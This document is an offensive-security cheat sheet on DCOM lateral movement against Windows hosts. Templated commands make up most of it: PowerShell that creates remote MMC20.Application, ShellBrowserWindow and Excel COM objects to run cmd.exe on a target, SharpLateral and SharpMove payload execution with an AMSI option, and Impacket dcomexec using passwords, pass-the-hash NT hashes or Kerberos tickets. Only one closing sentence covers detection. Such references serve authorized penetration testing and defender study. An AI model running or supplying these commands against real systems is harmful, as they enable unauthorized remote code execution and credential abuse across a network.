---
technique: DCOM
category: lateral-movement
targets: Windows Workstation, Windows Server
protocols: DCOM, MSRPC, SMB
remote_capable: true
tags: windows dcom msrpc impacket lateral-movement
---

# DCOM

DCOM lateral movement remotely activates COM objects that can launch processes on a target. It is useful when service creation is too noisy but RPC and DCOM access are available.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Network access | TCP 135 and dynamic RPC ports must be reachable |
| Credentials | The account needs remote activation rights and local privileges for the chosen object |
| Target software | Some objects require installed components such as MMC or Excel |

## Windows

### List DCOM applications

#powershell #native #dcom

List registered DCOM applications on the local host.

```powershell title:"List registered DCOM applications"
Get-CimInstance Win32_DCOMApplication
```
<!-- cheat -->

### Test RPC endpoint mapper

#powershell #native #rpc

Check whether the remote endpoint mapper is reachable.

```powershell title:"Test DCOM endpoint mapper"
Test-NetConnection -ComputerName "$rhost_name" -Port 135
```
<!-- cheat
var rhost_name
-->

### Create MMC20 object

#powershell #native #dcom

Create a remote MMC20.Application COM object.

```powershell title:"Create remote MMC20 COM object"
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "$rhost_name"))
```
<!-- cheat
var rhost_name
-->

### Execute through MMC20

#powershell #native #dcom

Run a command through the active MMC20 view.

```powershell title:"Execute command through MMC20"
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c $command","7")
```
<!-- cheat
var command
-->

### Create ShellBrowserWindow object

#powershell #native #dcom

Create a remote ShellBrowserWindow COM object by CLSID.

```powershell title:"Create remote ShellBrowserWindow object"
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "$rhost_name")
```
<!-- cheat
var rhost_name
-->

### Instantiate ShellBrowserWindow

#powershell #native #dcom

Instantiate the ShellBrowserWindow type returned from the remote host.

```powershell title:"Instantiate ShellBrowserWindow object"
$obj = [System.Activator]::CreateInstance($com)
```
<!-- cheat
-->

### Execute through ShellBrowserWindow

#powershell #native #dcom

Run a command through ShellBrowserWindow.

```powershell title:"Execute command through ShellBrowserWindow"
$obj.Document.Application.ShellExecute("cmd.exe","/c $command","C:\Windows\System32",$null,0)
```
<!-- cheat
var command
-->

### Create Excel object

#powershell #native #dcom

Create a remote Excel COM object when Office is installed.

```powershell title:"Create remote Excel COM object"
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "$rhost_name"))
```
<!-- cheat
var rhost_name
-->

### Activate Excel app

#powershell #native #dcom

Trigger Excel to launch a Microsoft application on the target.

```powershell title:"Activate Microsoft app through Excel"
$com.Application.ActivateMicrosoftApp("5")
```
<!-- cheat
-->

### SharpLateral DCOM

#cmd #sharplateral #dcom

Execute a payload with SharpLateral DCOM.

```cmd title:"Execute payload with SharpLateral DCOM"
SharpLateral.exe reddcom $rhost_name $payload_path
```
<!-- cheat
var rhost_name
var payload_path
-->

### SharpMove DCOM

#cmd #sharpmove #dcom

Execute a command through SharpMove using a DCOM method.

```cmd title:"Execute command with SharpMove DCOM"
SharpMove.exe action=dcom computername=$rhost_name command="$command" method=ShellBrowserWindow amsi=true
```
<!-- cheat
var rhost_name
var command
-->

## Linux

### Impacket dcomexec password

#impacket #dcomexec #password

Run a command through DCOM with password authentication.

```sh title:"Run Impacket dcomexec with password"
dcomexec.py "$domain/$user:$pass@$rhost_name" "$command"
```
<!-- cheat
var domain
var user
var pass
var rhost_name
var command
-->

### Impacket dcomexec hash

#impacket #dcomexec #pth

Run DCOMExec with NT hash authentication.

```sh title:"Run Impacket dcomexec with NT hash"
dcomexec.py -hashes "aad3b435b51404eeaad3b435b51404ee:$nt_hash" "$domain/$user@$rhost_name" "$command"
```
<!-- cheat
var nt_hash
var domain
var user
var rhost_name
var command
-->

### Impacket dcomexec MMC20

#impacket #dcomexec #mmc20

Run DCOMExec through the MMC20 object.

```sh title:"Run Impacket dcomexec through MMC20"
dcomexec.py -object MMC20 "$domain/$user:$pass@$rhost_name" "$command"
```
<!-- cheat
var domain
var user
var pass
var rhost_name
var command
-->

### Impacket dcomexec ShellBrowserWindow

#impacket #dcomexec #shellbrowserwindow

Run DCOMExec through ShellBrowserWindow without command output.

```sh title:"Run Impacket dcomexec through ShellBrowserWindow"
dcomexec.py -object ShellBrowserWindow -nooutput "$domain/$user:$pass@$rhost_name" "$command"
```
<!-- cheat
var domain
var user
var pass
var rhost_name
var command
-->

### Impacket dcomexec Kerberos

#impacket #dcomexec #kerberos

Run DCOMExec with an existing Kerberos ticket.

```sh title:"Run Impacket dcomexec with Kerberos"
dcomexec.py -k -no-pass "$domain/$user@$rhost_fqdn" "$command"
```
<!-- cheat
var domain
var user
var rhost_fqdn
var command
-->

## Detection

Watch for remote DCOM activation, RPC connections to TCP 135 with dynamic RPC follow-up traffic, and child processes spawned from COM server contexts.
